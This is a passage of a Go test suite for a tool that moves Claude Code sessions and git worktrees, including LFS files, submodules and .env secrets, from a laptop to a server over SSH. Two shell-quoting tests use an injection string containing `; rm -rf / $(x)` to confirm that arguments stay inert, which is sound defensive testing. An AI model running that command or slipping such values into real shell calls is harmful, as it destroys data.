	fake := exec.Command("sh", "-c", "sleep 30; : --resume "+sessionID)
	if err := fake.Start(); err != nil {
		t.Fatal(err)
	}
	done := make(chan error, 1)
	go func() { done <- fake.Wait() }()
	if err := stopSession(f.remoteHost(), sessionID); err != nil {
		t.Fatalf("stopRemoteSession failed: %v", err)
	}
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		fake.Process.Kill()
		t.Fatal("the session process was not stopped")
	}
}

func TestReadWorkspaceNamesAWorktreeAfterItsMainCheckout(t *testing.T) {
	f := newFixture(t)
	tree := filepath.Join(f.local, ".claude", "worktrees", "feat")
	f.git(f.local, "worktree", "add", "-q", "-b", "feat", tree)
	ws := f.workspace(tree)
	if ws.Name != "api" || ws.MainRoot != f.local {
		t.Errorf("Name = %q, MainRoot = %q; want api, %q", ws.Name, ws.MainRoot, f.local)
	}
}

func TestARepositoryWithoutCommitsIsHandedOffTwiceAndComesBack(t *testing.T) {
	f := newFixture(t)
	empty := filepath.Join(f.home, "laptop", "fresh", "fresh")
	f.git(f.home, "init", "-q", "-b", "main", empty)
	f.write(empty, "staged.txt", "staged")
	f.git(empty, "add", "staged.txt")
	f.write(empty, "loose.txt", "not staged")
	ws := f.workspace(empty)
	if ws.Git == nil || ws.Git.Head != "" || ws.Git.Branch != "main" {
		t.Fatalf("workspace = %+v", ws.Git)
	}
	r := f.remoteHost()
	where, err := place(r, ws, []string{"~/developer"}, "fresh", nil)
	if err != nil || where.NewFolder == "" {
		t.Fatalf("first handoff: %+v, %v", where, err)
	}
	if err := f.push(r, ws, where); err != nil {
		t.Fatal(err)
	}
	dir := where.Root
	if got, want := f.git(dir, "status", "--porcelain"), f.git(empty, "status", "--porcelain"); got != want {
		t.Errorf("status:\n%s\nwant:\n%s", got, want)
	}
	if got := f.git(dir, "symbolic-ref", "--short", "HEAD"); got != "main" {
		t.Errorf("branch = %q", got)
	}
	if err := park(f.machine(), ws.Root, ws); err != nil {
		t.Fatal(err)
	}

	home := f.machine()
	there, err := readWorkspace(r, dir, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := pullGit(r, home, there, empty); err != nil {
		t.Fatalf("coming back without commits: %v", err)
	}
	if err := park(r, dir, there); err != nil {
		t.Fatal(err)
	}
	f.write(empty, "loose.txt", "edited on the laptop before handing off again")
	again := f.workspace(empty)
	if where, err = place(r, again, []string{"~/developer"}, "fresh", nil); err != nil || where.Root != dir || where.NewFolder != "" {
		t.Fatalf("second handoff placed at %+v, %v; want the existing %s", where, err, dir)
	}
	if err := f.push(r, again, where); err != nil {
		t.Fatalf("second handoff: %v", err)
	}
	if err := park(f.machine(), again.Root, again); err != nil {
		t.Fatal(err)
	}

	f.git(dir, "commit", "-q", "-m", "first commit, made on the server")
	back, err := readWorkspace(r, dir, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if where, err = place(home, back, []string{"~/laptop"}, "fresh", nil); err != nil || where.Root != empty {
		t.Fatalf("pulling back placed at %+v, %v; want %s", where, err, empty)
	}
	if err := checkoutAccepts(home, where.Root, back); err != nil {
		t.Fatal(err)
	}
	if err := pullGit(r, home, back, empty); err != nil {
		t.Fatalf("pulling back: %v", err)
	}
	if got := f.git(empty, "log", "--format=%s"); got != "first commit, made on the server" {
		t.Errorf("laptop log = %q", got)
	}
	if got := f.read(empty, "loose.txt"); got != "edited on the laptop before handing off again" {
		t.Errorf("loose.txt = %q", got)
	}
}

func TestInspectingFromASubfolderFindsLFSFilesAndSecretsAcrossTheRepository(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, ".gitattributes", "assets/** filter=lfs\n")
	f.write(f.local, "assets/model.bin", "weights")
	f.write(f.local, "assets/it's \"odd\"\\.bin", "weights")
	f.write(f.local, "sub/.env", "SECRET=2")
	f.write(f.local, "sub/code.go", "package sub")
	ws := f.workspace(filepath.Join(f.local, "sub"))
	if got := strings.Join(ws.LFS, "|"); got != "assets/it's \"odd\"\\.bin|assets/model.bin" {
		t.Errorf("LFS = %q", got)
	}
	if got := strings.Join(ws.Secrets, "|"); got != "sub/.env" {
		t.Errorf("secrets = %q", got)
	}
	if ws.Subdir != "sub" {
		t.Errorf("subdir = %q", ws.Subdir)
	}
}

func TestUncommittedLFSFilesArriveWithTheirContent(t *testing.T) {
	if _, err := exec.LookPath("git-lfs"); err != nil {
		t.Skip("git-lfs isn't installed")
	}
	f := newFixture(t)
	for _, repo := range []string{f.local, f.remote} {
		f.git(repo, "config", "filter.lfs.clean", "git-lfs clean -- %f")
		f.git(repo, "config", "filter.lfs.smudge", "git-lfs smudge -- %f")
		f.git(repo, "config", "filter.lfs.process", "git-lfs filter-process")
		f.git(repo, "config", "filter.lfs.required", "true")
	}
	f.write(f.local, ".gitattributes", "*.bin filter=lfs diff=lfs merge=lfs -text\n")
	f.git(f.local, "add", ".gitattributes")
	f.git(f.local, "commit", "-q", "-m", "lfs")
	f.git(f.remote, "pull", "-q", f.local, "main")
	f.write(f.local, "weights.bin", "committed but never uploaded")
	f.git(f.local, "add", "weights.bin")
	f.git(f.local, "commit", "-q", "-m", "weights")
	f.write(f.local, "model.bin", "real model bytes")
	ws := f.workspace(f.local)
	if strings.Join(ws.LFS, ",") != "model.bin" {
		t.Fatalf("LFS = %v, want model.bin", ws.LFS)
	}
	if err := pushGit(f.machine(), f.remoteHost(), ws, f.remote); err != nil {
		t.Fatal(err)
	}
	if blob := f.git(f.remote, "cat-file", "-p", ws.Git.Worktree+":model.bin"); !strings.HasPrefix(blob, "version https://git-lfs") {
		t.Fatalf("the snapshot didn't go through the LFS filter: %q", blob)
	}
	if got := f.read(f.remote, "model.bin") + "|" + f.read(f.remote, "weights.bin"); got != "real model bytes|committed but never uploaded" {
		t.Errorf("LFS files on the server = %q", got)
	}
	if status := f.git(f.remote, "status", "--porcelain"); status != f.git(f.local, "status", "--porcelain") {
		t.Errorf("server status:\n%s", status)
	}
}

func TestChangesInsideASubmoduleMove(t *testing.T) {
	f := newFixture(t)
	lib := filepath.Join(f.home, "upstream", "lib")
	f.git(f.home, "init", "-q", "-b", "main", lib)
	f.write(lib, "lib.txt", "v1")
	f.git(lib, "add", ".")
	f.git(lib, "commit", "-q", "-m", "lib")
	f.git(f.local, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "vendor/my lib")
	f.git(f.local, "commit", "-q", "-m", "add lib")
	f.git(f.remote, "pull", "-q", f.local, "main")

	f.write(filepath.Join(f.local, "vendor/my lib"), "lib.txt", "edited inside the submodule")
	f.write(filepath.Join(f.local, "vendor/my lib"), "new.txt", "new inside the submodule")
	ws := f.workspace(f.local)
	if len(ws.Submodules) != 1 || ws.Submodules[0].Subpath != "vendor/my lib" {
		t.Fatalf("submodules = %+v", ws.Submodules)
	}
	if inside := f.workspace(filepath.Join(f.local, "vendor/my lib")); inside.Root != f.local || inside.Name != "api" || inside.Subdir != "vendor/my lib" {
		t.Errorf("a session started inside the submodule reads as root %s, name %s, subdir %s", inside.Root, inside.Name, inside.Subdir)
	}
	r := f.remoteHost()
	if err := f.push(r, ws, Placement{Root: f.remote}); err != nil {
		t.Fatal(err)
	}
	sub := filepath.Join(f.remote, "vendor/my lib")
	if got := f.read(sub, "lib.txt") + "|" + f.read(sub, "new.txt"); got != "edited inside the submodule|new inside the submodule" {
		t.Errorf("submodule on the server = %q", got)
	}
	if got := f.git(sub, "remote", "get-url", "origin"); got != lib {
		t.Errorf("the submodule created on the server has origin %q, want %q", got, lib)
	}
	if got := f.git(f.remote, "config", "submodule.vendor/my lib.url"); got != lib {
		t.Errorf("the submodule wasn't initialized on the server: url %q", got)
	}
	back, err := readWorkspace(r, f.remote, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(back.Submodules) != 1 {
		t.Fatalf("the server doesn't see the submodule it was given: %+v", back.Submodules)
	}
	if err := park(r, f.remote, back); err != nil {
		t.Fatal(err)
	}

	f.write(sub, "lib.txt", "edited by hand on the server")
	f.write(f.local, "kept.txt", "a later laptop edit")
	f.git(f.local, "update-ref", "-d", parkedRef)
	later := f.workspace(f.local)
	if err := f.push(r, later, Placement{Root: f.remote}); err == nil {
		t.Fatal("a hand edit inside the server's submodule was overwritten")
	}
	if got := f.read(f.remote, "kept.txt"); got != "v1" {
		t.Errorf("the parent checkout was changed before the submodule was checked: kept.txt = %q", got)
	}
}

func TestHostRejectsRelativeRoots(t *testing.T) {
	h := Host{SSH: "s", Claude: "c", Launcher: "rex", RexServer: "r", Roots: []string{"developer"}}
	if err := h.validate("server"); err == nil {
		t.Fatal("a relative root was accepted")
	}
	h.Roots = []string{"~/developer", "/srv/code"}
	if err := h.validate("server"); err != nil {
		t.Fatal(err)
	}
	h.Exclude = []string{"build/cache"}
	if err := h.validate("server"); err == nil {
		t.Fatal("an exclude with a slash was accepted, though find and tar would read it differently")
	}
}

func TestGroupsMirrorTheLaptopAndKeepTheServersLayout(t *testing.T) {
	home, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	for _, dir := range []string{"Projects/acme/api", "Projects/notes", "elsewhere/tool"} {
		if err := os.MkdirAll(filepath.Join(home, dir), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	roots := []string{"~/Missing", "~/Projects"}
	for dir, want := range map[string]string{
		"Projects/acme/api": "acme",
		"Projects/notes":    "notes",
		"elsewhere/tool":    "tool",
		"Projects":          "Projects",
	} {
		if got, err := localGroup(filepath.Join(home, dir), roots); err != nil || got != want {
			t.Errorf("localGroup(%s) = %q, %v; want %q", dir, got, err, want)
		}
	}
	for clone, want := range map[string]string{
		"/home/me/developer/acme/api-server": "acme",
		"/home/me/developer/notes":           "notes",
		"/srv/other/thing":                   "other",
	} {
		if got := serverGroup(clone, []string{"~/developer"}, "/home/me"); got != want {
			t.Errorf("serverGroup(%s) = %q, want %q", clone, got, want)
		}
	}
}

func TestNormalizeRemoteMatchesSshAndHttpsForms(t *testing.T) {
	want := "github.com/acme/api"
	for _, raw := range []string{
		"https://github.com/acme/api.git",
		"https://GitHub.com/acme/api/",
		"git@github.com:acme/api.git",
		"ssh://git@github.com/acme/api",
	} {
		if got := normalizeRemote(raw); got != want {
			t.Errorf("normalizeRemote(%q) = %q, want %q", raw, got, want)
		}
	}
}

func TestProjectSlugMatchesClaudeFolderNames(t *testing.T) {
	for dir, want := range map[string]string{
		"/home/me/developer/acme/api-server": "-home-me-developer-acme-api-server",
		"/home/me/café":                      "-home-me-caf-",
		"/home/me/a😀b":                       "-home-me-a--b",
	} {
		got, err := projectSlug(dir)
		if err != nil {
			t.Fatal(err)
		}
		if got != want {
			t.Errorf("projectSlug(%q) = %q, want %q", dir, got, want)
		}
	}
}

func TestSecretsAreFoundPastUnreadableFoldersAndSymlinksComeAlong(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads every folder")
	}
	f := newFixture(t)
	f.write(f.home, "shared/.env", "SHARED=1")
	if err := os.Symlink(filepath.Join(f.home, "shared/.env"), filepath.Join(f.local, ".env")); err != nil {
		t.Fatal(err)
	}
	locked := filepath.Join(f.local, "pgdata")
	if err := os.Mkdir(locked, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(locked, 0o755) })
	f.write(f.local, ".gitignore", ".env*\nnode_modules/\npgdata/\n")
	ws := f.workspace(f.local)
	if got := strings.Join(ws.Secrets, ","); got != ".env" {
		t.Fatalf("secrets = %q", got)
	}
	if err := f.push(f.remoteHost(), ws, Placement{Root: f.remote}); err != nil {
		t.Fatal(err)
	}
	if target, err := os.Readlink(filepath.Join(f.remote, ".env")); err != nil || target != filepath.Join(f.home, "shared/.env") {
		t.Errorf(".env on the server is %q, %v; want the same symlink", target, err)
	}
}

func TestRemoteErrorsShowTheShellsMessageWithoutTheScript(t *testing.T) {
	f := newFixture(t)
	_, err := sh(f.remoteHost(), `cd -- "$1"`, "/nonexistent-folder")
	if err == nil || strings.Contains(err.Error(), "set --") || len(err.Error()) > 200 || !strings.Contains(err.Error(), "/nonexistent-folder") {
		t.Errorf("err = %q", err)
	}
}

func TestUnparkExplainsThatPlainFoldersAreNeverParked(t *testing.T) {
	f := newFixture(t)
	notes := filepath.Join(f.home, "notes")
	f.write(notes, "todo.md", "x")
	if err := unpark(notes, io.Discard); err == nil || !strings.Contains(err.Error(), "isn't a git checkout") {
		t.Errorf("unpark on a plain folder gave %v", err)
	}
}

func TestSecretsInsideIgnoredFoldersComeAlongButNotFromExcludedOnes(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, ".gitignore", ".env*\nnode_modules/\nconfig/\n")
	f.write(f.local, "config/.env", "IN_AN_IGNORED_FOLDER=1")
	f.write(f.local, "config/app.json", "not a secret")
	f.write(f.local, "node_modules/pkg/.env", "not ours")
	f.write(f.local, "deep/er/.env.local", "NESTED=1")
	ws := f.workspace(f.local)
	got := strings.Join(ws.Secrets, ",")
	if got != "config/.env,deep/er/.env.local" && got != "deep/er/.env.local,config/.env" {
		t.Errorf("secrets = %q", got)
	}
}

func TestAnOriginMatchesByItsRawURLEvenWhenEachMachineResolvesItDifferently(t *testing.T) {
	ws := Workspace{Git: &GitState{Origin: "git@gitea:acme/api.git", OriginKey: "homelab.tailnet/acme/api"}}
	clones := []Clone{{Dir: "/srv/api", Origin: "git@gitea:acme/api", OriginKey: "localhost/acme/api"}}
	if got, err := matchClone(clones, ws, "server"); err != nil || got != "/srv/api" {
		t.Errorf("matchClone = %q, %v", got, err)
	}
}

func TestAnSSHAliasInTheRemoteMatchesTheSameRepositoryOverHTTPS(t *testing.T) {
	f := newFixture(t)
	f.write(f.home, ".fake-ssh-hosts", "github-work github.com\n")
	f.git(f.local, "remote", "set-url", "origin", "git@github-work:acme/api.git")
	r := f.remoteHost()
	clones, err := listClones(r, []string{"~/developer"})
	if err != nil {
		t.Fatal(err)
	}
	if got, err := matchClone(clones, f.workspace(f.local), r.Name()); err != nil || got != f.remote {
		t.Errorf("matchClone = %q, %v; want %s", got, err, f.remote)
	}
}

func TestRemoteScriptsReceiveEveryByteWhateverTheLoginShell(t *testing.T) {
	var tricky strings.Builder
	for b := 1; b < 256; b++ {
		tricky.WriteByte(byte(b))
	}
	args := []string{tricky.String(), `it's "$HOME" ; rm -rf / $(x) %s %%`, "", "-n", "line one\nline two"}
	for _, shell := range []string{"sh", "tcsh", "fish"} {
		t.Run(shell, func(t *testing.T) {
			path, err := exec.LookPath(shell)
			if err != nil {
				t.Skip(shell + " isn't installed")
			}
			f := newFixture(t)
			t.Setenv("CIELAGO_TEST_LOGIN_SHELL", path)
			out, err := sh(f.remoteHost(), `for a; do printf '%s\0' "$a"; done`, args...)
			if err != nil {
				t.Fatal(err)
			}
			got := strings.Split(strings.TrimSuffix(string(out), "\x00"), "\x00")
			if len(got) != len(args) {
				t.Fatalf("got %d arguments, want %d", len(got), len(args))
			}
			for i := range args {
				if got[i] != args[i] {
					t.Errorf("argument %d = %q, want %q", i, got[i], args[i])
				}
			}
		})
	}
}

func TestAHandoffWorksWhenTheServersLoginShellIsTcsh(t *testing.T) {
	path, err := exec.LookPath("tcsh")
	if err != nil {
		t.Skip("tcsh isn't installed")
	}
	f := newFixture(t)
	t.Setenv("CIELAGO_TEST_LOGIN_SHELL", path)
	f.messUp(f.local)
	odd := filepath.Join(f.home, "developer", `it's a "repo"`)
	f.git(f.home, "clone", "-q", f.local, odd)
	f.git(odd, "reset", "-q", "--hard", "HEAD~1")
	ws := f.workspace(f.local)
	if err := f.push(f.remoteHost(), ws, Placement{Root: odd}); err != nil {
		t.Fatal(err)
	}
	if got, want := f.git(odd, "status", "--porcelain"), f.git(f.local, "status", "--porcelain"); got != want {
		t.Errorf("status:\n%s\nwant:\n%s", got, want)
	}
}

func TestQuoteSurvivesTheShell(t *testing.T) {
	tricky := `it's "$HOME" ; rm -rf / $(x)`
	out, err := exec.Command("sh", "-c", "printf %s "+quote(tricky)).Output()
	if err != nil {
		t.Fatal(err)
	}
	if string(out) != tricky {
		t.Errorf("got %q, want %q", out, tricky)
	}
}

func TestExpandHomeOnlyExpandsALeadingTilde(t *testing.T) {
	for in, want := range map[string]string{
		"~/.local/bin/claude": "/h/.local/bin/claude",
		"~":                   "/h",
		"/opt/claude~1/bin":   "/opt/claude~1/bin",
		"~other/bin":          "~other/bin",
	} {
		if got := expandHome(in, "/h"); got != want {
			t.Errorf("expandHome(%q) = %q, want %q", in, got, want)
		}
	}
}

func waitForFile(t *testing.T, path string, within time.Duration) bool {
	t.Helper()
	deadline := time.Now().Add(within)
	for time.Now().Before(deadline) {
		if _, err := os.Stat(path); err == nil {
			return true
		}
		time.Sleep(100 * time.Millisecond)
	}
	return false
}

func startFakeClaude(t *testing.T, seconds string) *exec.Cmd {
	t.Helper()
	cmd := exec.Command("sleep", seconds)
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	go cmd.Wait()
	t.Cleanup(func() { cmd.Process.Kill() })
	return cmd
}

func TestRetireClosesATerminalSessionAndRetiresItsTranscript(t *testing.T) {
	t.Setenv("REX_SESSION", "")
	transcript := filepath.Join(t.TempDir(), "s.jsonl")
	if err := os.WriteFile(transcript, []byte("{}"), 0o600); err != nil {
		t.Fatal(err)
	}
	claude := startFakeClaude(t, "60")
	if err := retire(armed{Host: "server", PID: claude.Process.Pid}, "0f0f0f0f-1111-2222-3333-aaaaaaaaaaaa", transcript); err != nil {
		t.Fatal(err)
	}
	if !waitForFile(t, transcript+".handed-off-to-server", 5*time.Second) {
		t.Fatal("transcript was not retired after the session was closed")
	}
}

func TestRetireLeavesADesktopSessionRunningUntilItIsArchived(t *testing.T) {
	transcript := filepath.Join(t.TempDir(), "s.jsonl")
	if err := os.WriteFile(transcript, []byte("{}"), 0o600); err != nil {
		t.Fatal(err)
	}
	claude := startFakeClaude(t, "3")
	if err := retire(armed{Host: "server", PID: claude.Process.Pid, Desktop: true}, "0f0f0f0f-1111-2222-3333-bbbbbbbbbbbb", transcript); err != nil {
		t.Fatal(err)
	}
	if waitForFile(t, transcript+".handed-off-to-server", 2*time.Second) {
		t.Fatal("desktop session was stopped or its transcript moved before it archived itself")
	}
	if !waitForFile(t, transcript+".handed-off-to-server", 4*time.Second) {
		t.Fatal("transcript was not retired after the desktop session exited")
	}
}

func TestHandedOffAsksDesktopSessionsToArchiveThemselves(t *testing.T) {
	desktop := handedOff(armed{Host: "server", Desktop: true}, Result{ShownOn: []string{"Laptop"}})
	if desktop["decision"] != "block" || !strings.Contains(desktop["reason"], "archive_session") {
		t.Errorf("desktop output = %v", desktop)
	}
	terminal := handedOff(armed{Host: "server"}, Result{ShownOn: []string{"Laptop"}})
	if _, blocks := terminal["decision"]; blocks || terminal["systemMessage"] == "" {
		t.Errorf("terminal output = %v", terminal)
	}
}

func TestPullBringsWorkDoneOnTheServerBackToTheParkedLaptop(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	out := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), out, f.remote); err != nil {
		t.Fatal(err)
	}
	if err := park(f.machine(), out.Root, out); err != nil {
		t.Fatal(err)
	}
	f.write(f.remote, "edited.txt", "finished on the server")
	f.git(f.remote, "add", "edited.txt")
	f.write(f.remote, "server-new.txt", "new on the server")

	back, err := readWorkspace(f.remoteHost(), f.remote, []string{".env"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := pullGit(f.remoteHost(), f.machine(), back, f.local); err != nil {
		t.Fatalf("pulling back into the parked laptop failed: %v", err)
	}
	if got, want := f.git(f.local, "status", "--porcelain"), f.git(f.remote, "status", "--porcelain"); got != want {
		t.Errorf("laptop status after pulling:\n%s\nwant:\n%s", got, want)
	}
	if got := f.read(f.local, "edited.txt") + "|" + f.read(f.local, "server-new.txt"); got != "finished on the server|new on the server" {
		t.Errorf("laptop files after pulling = %q", got)
	}
	if refs := f.git(f.remote, "for-each-ref", "refs/cielago"); refs != "" {
		t.Errorf("the server kept refs after the pull: %s", refs)
	}
}

func TestLogFindsTheLastSessionSentToAHost(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	if _, err := lastHandoffTo("server"); err == nil {
		t.Fatal("found a session in an empty log")
	}
	for _, e := range []logEntry{
		{Time: time.Now(), Kind: "push", Session: "11111111-0000-0000-0000-000000000000", From: "laptop", To: "server", FromDir: "/a", ToDir: "/b"},
		{Time: time.Now(), Kind: "push", Session: "22222222-0000-0000-0000-000000000000", From: "laptop", To: "other", FromDir: "/a", ToDir: "/c"},
		{Time: time.Now(), Kind: "push", Session: "33333333-0000-0000-0000-000000000000", From: "laptop", To: "server", FromDir: "/d", ToDir: "/e"},
	} {
		if err := appendLog(e); err != nil {
			t.Fatal(err)
		}
	}
	got, err := lastHandoffTo("server")
	if err != nil || got != "33333333-0000-0000-0000-000000000000" {
		t.Fatalf("lastHandoffTo = %q, %v", got, err)
	}
	if err := appendLog(logEntry{Time: time.Now(), Kind: "pull", Session: "33333333-0000-0000-0000-000000000000", From: "server", To: "laptop"}); err != nil {
		t.Fatal(err)
	}
	if _, err := lastHandoffTo("server"); err == nil || !strings.Contains(err.Error(), "already brought back") {
		t.Errorf("after pulling it back, lastHandoffTo gave %v", err)
	}
	var out strings.Builder
	if err := status(&out); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), "33333333") || !strings.Contains(out.String(), "laptop:/d → server:/e") {
		t.Errorf("status output:\n%s", out.String())
	}
}

func TestClaudeVersionCheckFailsOldAndWarnsNew(t *testing.T) {
	for text, want := range map[string]string{
		"2.1.1 (Claude Code)":              "✗",
		testedClaude[1] + " (Claude Code)": "✓",
		"9.0.0 (Claude Code)":              "!",
	} {
		var out strings.Builder
		c := &checks{out: &out}
		c.claudeVersion("here", text)
		if !strings.HasPrefix(strings.TrimSpace(out.String()), want) {
			t.Errorf("%s gave %q, want %s", text, out.String(), want)
		}
	}
}

func TestTmuxLauncherOpensItsOwnWindowAndCleansUp(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	tm := Tmux{remote: f.remoteHost()}

	first, err := tm.Start("my.group", "api · claude", f.remote, []string{"sleep", "60"})
	if err != nil {
		t.Fatal(err)
	}
	if !first.SessionCreated || !strings.HasPrefix(first.Session, "$") || !strings.HasPrefix(first.Window, "@") || !strings.HasPrefix(first.Pane, "%") {
		t.Fatalf("first tab = %+v", first)
	}
	if env, _ := exec.Command("tmux", "show-environment", "-g", "LC_ALL").CombinedOutput(); strings.Contains(string(env), "LC_ALL=C") {
		t.Errorf("the tmux server started with cielago's LC_ALL=C: %s", env)
	}
	second, err := tm.Start("my.group", "web · claude", f.remote, []string{"sleep", "60"})
	if err != nil {
		t.Fatal(err)
	}
	if second.SessionCreated || second.Session != first.Session {
		t.Fatalf("second tab = %+v, want a window in the same session", second)
	}
	if err := tm.OpenProjectTab(second, "web", f.remote, "echo ready"); err != nil {
		t.Fatal(err)
	}
	windows, _ := exec.Command("tmux", "list-windows", "-t", first.Session, "-F", "#{window_name}").Output()
	if got := strings.Fields(strings.ReplaceAll(string(windows), " · ", "·")); strings.Join(got, ",") != "api·claude,web·claude,web" {
		t.Errorf("windows = %q", windows)
	}
	if err := tm.Discard(second); err != nil {
		t.Fatal(err)
	}
	if err := tm.Discard(first); err != nil {
		t.Fatal(err)
	}
	if out, _ := exec.Command("tmux", "list-sessions").CombinedOutput(); strings.Contains(string(out), "my.group") {
		t.Errorf("session left behind: %s", out)
	}
}

func TestACloneAtTheSamePathOnBothMachinesIsFound(t *testing.T) {
	f := newFixture(t)
	r := f.remoteHost()
	clones, err := listClones(r, []string{f.home + "/laptop"})
	if err != nil {
		t.Fatal(err)
	}
	if got, err := matchClone(clones, f.workspace(f.local), r.Name()); err != nil || got != f.local {
		t.Fatalf("matchClone = %q, %v; want the clone at the same path", got, err)
	}
}

func TestTheSameRootListedTwiceCountsOnce(t *testing.T) {
	f := newFixture(t)
	alias := filepath.Join(f.home, "dev-alias")
	if err := os.Symlink(filepath.Join(f.home, "developer"), alias); err != nil {
		t.Fatal(err)
	}
	clones, err := listClones(f.remoteHost(), []string{"~/developer", "~/dev-alias"})
	if err != nil {
		t.Fatal(err)
	}
	if got, err := matchClone(clones, f.workspace(f.local), "server"); err != nil || got != f.remote {
		t.Fatalf("matchClone = %q, %v; want one clone", got, err)
	}
}

func TestFindRemoteSessionPrefersTheNewestRecordAndRejectsBadIDs(t *testing.T) {
	f := newFixture(t)
	id := "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
	f.write(f.home, ".claude/projects/-x/"+id+".jsonl", `{"cwd":"/old"}`+"\n")
	f.write(f.home, ".claude/sessions/1.json", `{"pid":1,"sessionId":"`+id+`","cwd":"/stale","startedAt":100}`)
	f.write(f.home, ".claude/sessions/2.json", `{"pid":2,"sessionId":"`+id+`","cwd":"/live","startedAt":200}`)
	s, err := findRemoteSession(f.remoteHost(), "server", id)
	if err != nil {
		t.Fatal(err)
	}
	if s.Live == nil || s.Live.PID != 2 || s.Cwd != "/live" {
		t.Errorf("session = %+v, want the newest record", s)
	}
	if _, err := findRemoteSession(f.remoteHost(), "server", "*"); err == nil || !strings.Contains(err.Error(), "not a Claude session id") {
		t.Errorf("err = %v, want an invalid id refusal", err)
	}
}

func TestStopAtTurnEndWaitsForTheTurnAndOnlyStopsClaude(t *testing.T) {
	f := newFixture(t)
	id := "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
	fake := exec.Command("sh", "-c", "sleep 30; : claude --resume "+id)
	if err := fake.Start(); err != nil {
		t.Fatal(err)
	}
	done := make(chan error, 1)
	go func() { done <- fake.Wait() }()
	pid := strconv.Itoa(fake.Process.Pid)
	f.write(f.home, ".claude/sessions/"+pid+".json", `{"pid":`+pid+`,"sessionId":"`+id+`","status":"busy"}`)
	idle := `{"pid":` + pid + `,"sessionId":"` + id + `","status":"idle"}`
	go func() {
		time.Sleep(2500 * time.Millisecond)
		if err := os.WriteFile(filepath.Join(f.home, ".claude/sessions", pid+".json"), []byte(idle), 0o644); err != nil {
			t.Error(err)
		}
	}()
	var out strings.Builder
	started := time.Now()
	if err := stopAtTurnEnd(f.remoteHost(), remoteSession{ID: id, Live: &liveSession{PID: fake.Process.Pid}}, &out); err != nil {
		t.Fatal(err)
	}
	if time.Since(started) < 2*time.Second || !strings.Contains(out.String(), "Waiting") {
		t.Errorf("stopped before the turn ended (%s, %q)", time.Since(started), out.String())
	}
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		fake.Process.Kill()
		t.Fatal("the session process wasn't stopped")
	}

	other := exec.Command("sleep", "30")
	if err := other.Start(); err != nil {
		t.Fatal(err)
	}
	defer other.Process.Kill()
	if err := stopAtTurnEnd(f.remoteHost(), remoteSession{ID: id, Live: &liveSession{PID: other.Process.Pid}}, &out); err != nil {
		t.Fatal(err)
	}
	if err := other.Process.Signal(syscall.Signal(0)); err != nil {
		t.Error("a process that isn't Claude was stopped")
	}
}

func TestPullRefusesALocalCheckoutWithItsOwnChangesBeforeStoppingAnything(t *testing.T) {
	f := newFixture(t)
	f.write(f.local, "kept.txt", "laptop edit")
	ws := f.workspace(f.remote)
	if err := checkoutAccepts(f.machine(), f.local, ws); err == nil {
		t.Fatal("a laptop checkout with its own changes was accepted")
	}
	f.git(f.local, "checkout", "-q", "--", "kept.txt")
	if err := checkoutAccepts(f.machine(), f.local, ws); err != nil {
		t.Fatalf("a clean checkout was refused: %v", err)
	}
}

const fakeClaudeThatStarts = `#!/bin/sh
mkdir -p "$HOME/.claude/sessions"
printf '{"pid":%s,"sessionId":"%s","cwd":"%s","startedAt":%s000,"bridgeSessionId":"bridge"}' $$ "$2" "$PWD" "$(date +%s)" > "$HOME/.claude/sessions/$$.json"
exec sleep 60
`

func TestAHandoffMovesTheSessionAndOpensItInItsOwnTab(t *testing.T) {
	f := newFixture(t)
	f.isolatedTmux()
	claude := f.tool("claude", fakeClaudeThatStarts)

	f.messUp(f.local)
	id := "0f0f0f0f-1111-2222-3333-444444444444"
	slug, err := projectSlug(f.local)
	if err != nil {
		t.Fatal(err)
	}
	transcript := filepath.Join(f.home, ".claude", "projects", slug, id+".jsonl")
	f.write(filepath.Dir(transcript), id+".jsonl", `{"cwd":"`+f.local+`"}`+"\n")

	res, err := Handoff{
		HostName:       "server",
		Host:           Host{SSH: "fakehost", Claude: claude, Roots: []string{"~/developer"}, Secrets: []string{".env"}, Launcher: "tmux", LocalRoots: []string{"~/laptop"}},
		SessionID:      id,
		TranscriptPath: transcript,
		Cwd:            f.local,
	}.Run()
	if err != nil {
		t.Fatalf("handoff failed after %s: %v", res.Summary(), err)
	}
	if res.ToDir != f.remote || res.NewFolder != "" {
		t.Errorf("handed off to %s (new folder %q), want the existing clone %s", res.ToDir, res.NewFolder, f.remote)
	}
	if got, want := f.git(f.remote, "status", "--porcelain"), f.git(f.local, "status", "--porcelain"); got != want {
		t.Errorf("server status:\n%s\nwant:\n%s", got, want)
	}
	if got := f.read(f.remote, ".env"); got != "SECRET=1" {
		t.Errorf(".env on the server = %q", got)
	}
	remoteSlug, _ := projectSlug(f.remote)
	if got := f.read(filepath.Join(f.home, ".claude", "projects", remoteSlug), id+".jsonl"); !strings.Contains(got, f.local) {
		t.Errorf("transcript on the server = %q", got)
	}
	if ref := f.git(f.local, "rev-parse", "-q", "--verify", parkedRef); ref == "" {
		t.Error("the laptop checkout wasn't marked as handed off")
	}
	windows, _ := exec.Command("tmux", "list-windows", "-a", "-F", "#{session_name} #{window_name}").Output()
	if !strings.Contains(string(windows), "acme api · claude") {
		t.Errorf("tmux windows = %q, want the session's own tab in the acme session", windows)
	}
}

const fakeClaudeCLI = `#!/bin/sh
case "$1" in
  --version) echo "2.1.325 (Claude Code)" ;;
